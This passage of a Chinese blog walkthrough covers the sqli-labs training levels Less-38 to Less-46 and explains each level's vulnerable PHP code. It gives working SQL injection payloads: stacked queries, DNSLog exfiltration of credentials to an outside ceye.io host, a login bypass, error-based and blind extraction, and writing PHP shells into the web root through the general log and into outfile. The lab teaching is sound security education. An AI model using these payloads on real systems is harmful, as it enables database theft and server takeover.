class="line-numbers-rows"><span></span></span></code></pre><p>注入天书里面说 Oracle 不支持堆叠查询，这个 我对 Oracle 不熟悉，以后接触到了 再亲自尝试看看。</p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>又到了简单源码分析的时间了，来看看堆叠注入的代码是如何实现的：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id 参数直接带入到 SQL 语句中</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    输出查询信息<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>变成了现在的：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p><p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p><p><strong>添加字段值</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库中查看是否添加成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span> <span class="token number">23</span> <span class="token operator">|</span> hello    <span class="token operator">|</span> world    <span class="token operator">|</span>+----+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来 演示我认为比较实用的姿势。</p><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>需要条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （<a href="http://hyuga.co/">Hyuga</a>、<a href="http://ceye.io/">CEYE</a>）</li><li>Windows 平台</li></ol><p>load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><pre class="line-numbers language-none"><code class="language-none">\\192.168.31.53\test\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p><p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p><p>下面 临时使用 Windows 下的 PHPStudy 来搭建 sqli-labs 测试环境：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;select load_file(concat(&#39;\\\\&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.gvc791.ceye.io\\abc&#39;))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p><p><img src="https://image.3001.net/images/20200517/15897015756622.png" alt="img"></p><p>手动 Hex 解码即可</p><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>需要条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>首先查看当前的日志的相关配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW VARIABLES LIKE <span class="token string">'general%'</span><span class="token punctuation">;</span>+------------------+---------------------------------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value                           <span class="token operator">|</span>+------------------+---------------------------------+<span class="token operator">|</span> general_log      <span class="token operator">|</span> OFF                             <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span> /var/lib/mysql/bb198f1a9cc6.log <span class="token operator">|</span>+------------------+---------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Docker 里面的这个 Ubuntu 环境默认是没有开启的，这里尝试注入的时候手动开启：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后 MySQL 再查看日志配置是否被修改了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW VARIABLES LIKE <span class="token string">'general%'</span><span class="token punctuation">;</span>+------------------+-------------------------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value                   <span class="token operator">|</span>+------------------+-------------------------+<span class="token operator">|</span> general_log      <span class="token operator">|</span> ON                      <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span> /var/www/html/shell.php <span class="token operator">|</span>+------------------+-------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个尝试 getshell：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p><p>查看一下当的日志文件：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$ cat <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>shell<span class="token punctuation">.</span>php<span class="token number">200517</span>  <span class="token number">8</span>:<span class="token number">47</span>:<span class="token number">04</span>       <span class="token number">10</span> <span class="token keyword">Connect</span>    root<span class="token variable">@localhost</span> <span class="token keyword">on</span> security           <span class="token number">10</span> Init DB    security           <span class="token number">10</span> Query    <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?>'</span><span class="token comment">-- ' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时已经成功写入了，但是因为这个文件属于 mysql 用户组的， 我测试并没有成功执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -l  /var/www/html/shell.php-rw-rw---- <span class="token number">1</span> mysql mysql <span class="token number">171</span> May <span class="token number">17</span> 08:47 /var/www/html/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过在 Windows 下 phpstudy 测试是可以很成功的 getshell 的，如果有师傅补充的话 欢迎评论区留言！</p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-38 相比只是拼接方式不一样。</p><p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样， 这里不再赘述。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>username=&#39;$username&#39;</code></td></tr></tbody></table><ul><li><code>index.php</code></li></ul><p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p><ul><li><code>forgot_password.php</code></li></ul><p>if you forgot your password,go to hack it</p><ul><li><code>acc-create.php</code></li></ul><p>if you need to create account,then hack your way in</p><ul><li><code>failed.php</code></li></ul><p>Bug off you silly dump hacker</p><ul><li><code>login.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># username 被过滤 ' " \ password 没有被</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># 堆叠查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> 查询成功：    <span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> 登录成功<span class="token punctuation">:</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Auth"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    跳转到 logged<span class="token operator">-</span>in<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>logged-in.php</code></li></ul><p>登录成功，提供修改密码的表单</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mylogin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pass_change.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> 没有登录<span class="token punctuation">:</span>    重定向到 index<span class="token operator">.</span>php<span class="token keyword">if</span> 提交了修改密码表单<span class="token punctuation">:</span>    <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token variable">$pass</span><span class="token operator">==</span><span class="token variable">$re_pass</span><span class="token punctuation">:</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p><p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-42/login.php</span> <span class="token http-version property">HTTP/1.1</span></span>...login_user=admin&amp;login_password=1' or 1#&amp;mysubmit=Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为登录成功后返回：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以登录了 id 为 1 的 Dumb 用户：</p><p><img src="https://image.3001.net/images/20200517/15897218466276.png" alt="img"></p><p>尝试<strong>联合查询</strong>:</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-42/login.php</span> <span class="token http-version property">HTTP/1.1</span></span>...login_user=admin&amp;login_password=1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit=Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>报错注入</strong>：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">login_user&#x3D;admin&amp;login_password&#x3D;1&#39; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;mysubmit&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同理这里也可以进行盲注和堆叠查注入， 这里不再赘述。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>username=&#39;$username&#39;</code></td></tr></tbody></table><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、布尔盲注、延时盲注、堆叠注入</td><td align="left"><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># GET 方式获取 sort 参数</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># 直接将 id 带入 SQL 中</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> 查询成功：    输出查询信息<span class="token keyword">else</span>：    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p><h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul><li><strong>升序和降序验证</strong></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 升序排序</span>?sort<span class="token operator">=</span><span class="token number">1</span> asc<span class="token comment"># 降序排序</span>?sort<span class="token operator">=</span><span class="token number">1</span> dasc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>rand() 验证</strong></li></ul><p>rand(ture) 和 rand(false) 的结果是不一样的</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(true)?sort&#x3D;rand(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p><p>此外 rand() 结果是一直都是随机的</p><pre class="line-numbers language-none"><code class="language-none">?sort&#x3D;rand()?sort&#x3D;1 and rand()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><strong>延时验证</strong></li></ul><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;sleep(1)?sort&#x3D;(sleep(1))?sort&#x3D;1 and sleep(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p><h3 id="报错注入1-2"><a href="#报错注入1-2" class="headerlink" title="报错注入1"></a>报错注入1</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="报错注入2-2"><a href="#报错注入2-2" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>利用 procedure analyse 参数，也可以执行报错注入。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&#39;:&#39;,username,password)+FROM+users limit 0,1))),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第 1 位为：s</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="延时盲注-2"><a href="#延时盲注-2" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即`s</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>将查询结果导入到文件中</strong>：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/less46.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p><p>访问验证是否有信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8888/less46.txt<span class="token number">1</span>    Dumb    Dumb<span class="token number">2</span>    Angelina    I-kill-you<span class="token number">3</span>    Dummy    p@ssword<span class="token number">4</span>    secure    crappy<span class="token number">5</span>    stupid    stupidity<span class="token number">6</span>    superman    genious<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token number">8</span>    admin    admin<span class="token number">9</span>    admin1    admin1<span class="token number">10</span>    admin2    admin2<span class="token number">11</span>    admin3    admin3<span class="token number">12</span>    dhakkan    dumbo<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>利用导出文件 getshell</strong>：</p><p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p><p>来查看下写入的文件内容是啥样子的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /var/www/html/less46.php <span class="token number">1</span>    Dumb    Dumb<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">2</span>    Angelina    I-kill-you<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">3</span>    Dummy    p@ssword<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">4</span>    secure    crappy<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">5</span>    stupid    stupidity<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">6</span>    superman    genious<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">8</span>    admin    admin<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">9</span>    admin1    admin<span class="token operator"><span class="token file-descriptor important">1</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">10</span>    admin2    admin<span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">11</span>    admin3    admin<span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">12</span>    dhakkan    dumbo<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">14</span>  